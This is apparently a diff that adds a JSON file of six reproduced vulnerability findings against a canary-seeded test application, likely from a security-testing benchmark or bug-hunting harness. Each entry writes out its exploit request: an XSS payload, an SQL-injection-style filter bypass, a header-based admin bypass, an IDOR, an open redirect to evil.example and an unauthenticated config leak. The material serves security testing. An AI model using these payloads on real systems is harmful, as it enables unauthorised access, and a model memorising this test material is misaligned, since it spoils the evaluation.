@@ -1,0 +1,86 @@
+[
+  {
+    "title": "IDOR on /api/notes — missing owner check on id parameter",
+    "class": "IDOR",
+    "endpoint": "/api/notes?id=7",
+    "evidence": [
+      {
+        "request": "GET /api/notes?id=7 with hunter session cookie",
+        "observation": "200 returns note owned by canary_user; body carries MYTHOS-CANARY-3d9f2b7c; control: own-note listing shows only hunter's notes"
+      }
+    ],
+    "canary_used": true,
+    "repro_runs": 3,
+    "severity": "high"
+  },
+  {
+    "title": "Open redirect on /redirect — unvalidated external url parameter",
+    "class": "Open Redirect",
+    "endpoint": "/redirect?url=https://evil.example",
+    "evidence": [
+      {
+        "request": "GET /redirect?url=https://evil.example",
+        "observation": "302 with Location: https://evil.example/; control: url=/login redirects locally without incident"
+      }
+    ],
+    "canary_used": true,
+    "repro_runs": 3,
+    "severity": "medium"
+  },
+  {
+    "title": "Reflected XSS in /search — raw reflection of q parameter into HTML",
+    "class": "Reflected XSS",
+    "endpoint": "/search?q=<svg onload=alert(1)>",
+    "evidence": [
+      {
+        "request": "GET /search?q=%3Csvg%20onload%3Dalert(1)%3E",
+        "observation": "200 HTML body contains '<p>You searched for: <svg onload=alert(1)></p>' — payload reflected unescaped"
+      }
+    ],
+    "canary_used": true,
+    "repro_runs": 3,
+    "severity": "medium"
+  },
+  {
+    "title": "Admin gate bypass on /admin via client-trusted X-Internal-Auth header",
+    "class": "Auth Bypass",
+    "endpoint": "/admin",
+    "evidence": [
+      {
+        "request": "GET /admin with header X-Internal-Auth: 1",
+        "observation": "200 JSON with admin dashboard and flag MYTHOS-CANARY-ADMIN-77c1; control without header: 403 forbidden"
+      }
+    ],
+    "canary_used": true,
+    "repro_runs": 3,
+    "severity": "high"
+  },
+  {
+    "title": "Information disclosure — internal config exposed unauthenticated at /api/config",
+    "class": "Information Disclosure",
+    "endpoint": "/api/config",
+    "evidence": [
+      {
+        "request": "GET /api/config (no session)",
+        "observation": "200 JSON exposes env=production, internal_host=10.0.0.5:3101, debug=true, simulated credential — no authentication required"
+      }
+    ],
+    "canary_used": true,
+    "repro_runs": 3,
+    "severity": "medium"
+  },
+  {
+    "title": "Filter bypass on /api/users name parameter (simulated injection sink) returns all rows",
+    "class": "SQL Injection",
+    "endpoint": "/api/users?name=x' OR '1'='1",
+    "evidence": [
+      {
+        "request": "GET /api/users?name=x' OR '1'='1 with hunter session",
+        "observation": "200 returns all 6 rows including admin row with internal_note MYTHOS-CANARY-8e41c0aa; response states filter bypassed (simulated sink — no real SQL engine)"
+      }
+    ],
+    "canary_used": true,
+    "repro_runs": 3,
+    "severity": "high"
+  }
+]
